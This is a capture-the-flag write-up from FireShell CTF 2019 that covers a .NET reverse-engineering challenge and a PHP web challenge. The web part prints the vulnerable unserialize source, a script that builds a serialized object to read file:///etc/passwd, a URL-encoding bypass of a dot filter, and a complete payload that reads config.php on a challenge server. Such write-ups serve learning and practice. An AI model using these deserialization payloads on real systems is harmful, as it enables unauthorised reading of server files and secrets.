# FireShell CTF 2019

## RE - BlackBox Cypher

Task :

![](.gitbook/assets/image%20%28144%29.png)

It's .Net file so we put it in dnspy

![](.gitbook/assets/image%20%28156%29.png)

Oops...obfuscated, try to clean it with de4dot

![](.gitbook/assets/image%20%28120%29.png)

Better, but still fucking so heavy. It's quite easy to know that the file work/obfuscated like this :

It created 100+ junk class, each have few function \(2-6 func\) and call to each other

Sounds pain in the ass, right?

Also, the challenge name is "Blackbox Cipher", so i assume that i dont even need to understand the algorithm behind it.

So i trying to run the binary, dump it and search for string in memory.

But where to stop to dump? Well, there is no other way around, you must debug the application to see where it generate the crypted flag.

![](.gitbook/assets/image%20%28181%29.png)

As you can see, after navigate through the code for a while, i realize the result is my encoded flag, where it's only assigned at

```text
result = Class9.smethod_1(null, type).vmethod_3(this.method_149()).vmethod_0();
```

Now i know that somehow it calculate encoded flag in those method, which mean it init flag somewhere in that too.

So there is 2 ways to solve this problem at this moment :

1. You keep debugging through these code and search through memory too.
2. You just now dump the memory, base64\("F\#{"\) and search in memory

Both work well,  i checked after ctf end, but when the ctf is running, i choose first one, because :

1. I dont know flag format since i havent read rules page...oops!
2. I am afraid that it will some where delete the flag out of memory before it return the encoded flag or maybe it can split flag into many method, and receive few bytes from each, null it after used immediately

After 15 minutes of pressing F11, i finally got

![](.gitbook/assets/image%20%28187%29.png)

Base64 decode it, we got flag

```text
F#{It's_all_about_memory_forensics}
```



## Web - Vice

Task :

```php
<?php
//require_once 'config.php';

class SHITS{
  private $url;
  private $method;
  private $addr;
  private $host;
  private $name;

  function __construct($method,$url){
    $this->method = $method;
    $this->url = $url;
  }

  function doit(){
    
    $this->host = @parse_url($this->url)['host'];
    $this->addr = @gethostbyname($this->host);
    $this->name = @gethostbyaddr($this->host);
    if($this->addr !== "127.0.0.1" || $this->name === false){
      $not = ['.txt','.php','.xml','.html','.','[',']'];
      foreach($not as $ext){
        $p = strpos($this->url,$ext);
        if($p){
          die(":)");
        }
      }
      $ch = curl_init();
      curl_setopt($ch,CURLOPT_URL,$this->url);
      curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);

      $result = curl_exec($ch);
      echo $result;
    }else{
      die(":)");
    }
  }
  function __destruct(){
    if(in_array($this->method,array("doit"))){
 
      call_user_func_array(array($this,$this->method),array());
    }else{
      die(":)");
    }
  }
}
if(isset($_GET["gg"])) {
    @unserialize($_GET["gg"]);
} else {
    highlight_file(__FILE__);
}
```

I was trying to solve Boring Check, but then our team rank is down quickly to 3rd, and we must solve one more chall to keep our rank, compete with @bi0s for 3rd place. Time to call help from home.

![](.gitbook/assets/image%20%2842%29.png)

From @Thach works, we finally can craft the payload and read file base on php unserialize bug



```php
//Credit : Thach Nguyen Hoang
<?php
//require_once 'config.php';

class SHITS{
  private $url;
  private $method;
  private $addr;
  private $host;
  private $name;

  function __construct($method,$url){
    $this->method = $method;
    $this->url = $url;
  }

  function doit(){
    
    $this->host = @parse_url($this->url)['host'];
    echo $this->host;
    $this->addr = @gethostbyname($this->host);
    $this->name = @gethostbyaddr($this->host);
    if($this->addr !== "127.0.0.1" || $this->name === false){
      $not = ['.txt','.php','.xml','.html','.','[',']'];
      foreach($not as $ext){
        $p = strpos($this->url,$ext);
        if($p){
          echo $ext;
          die(":)");
        }
      }
      $ch = curl_init();
      curl_setopt($ch,CURLOPT_URL,$this->url);
      curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);

      $result = curl_exec($ch);
      /* echo $result; */
    }else{
      die(":)");
    }
  }
  
  function __destruct(){
    if(in_array($this->method,array("doit"))){
 
      call_user_func_array(array($this,$this->method),array());
    }else{
      die(":)");
    }
  }
}


$o = new SHITS('doit', 'file:///etc/passwd');
echo urlencode(serialize($o));
```

What next? Where is flag?

```text
//require_once 'config.php';
```

There is commented line on challenge source. But it have '.' inside file name, which is filtered. So to bypass strpos\(\), we use urlencode, and guess the path to config.php, which is :

```text
/var/www/html/config%2ephp
```

Final payload

```text
view-source:http://68.183.31.62:991/?gg=O%3A5%3A%22SHITS%22%3A5%3A%7Bs%3A10%3A%22%00SHITS%00url%22%3Bs%3A33%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22%3Bs%3A13%3A%22%00SHITS%00method%22%3Bs%3A4%3A%22doit%22%3Bs%3A11%3A%22%00SHITS%00addr%22%3BN%3Bs%3A11%3A%22%00SHITS%00host%22%3BN%3Bs%3A11%3A%22%00SHITS%00name%22%3BN%3B%7D
```

Flag

```text
F#{wtf_5trp0s_}
```



## Last words

We end up at 3rd place. Time to practice more...

![](.gitbook/assets/image%20%28149%29.png)

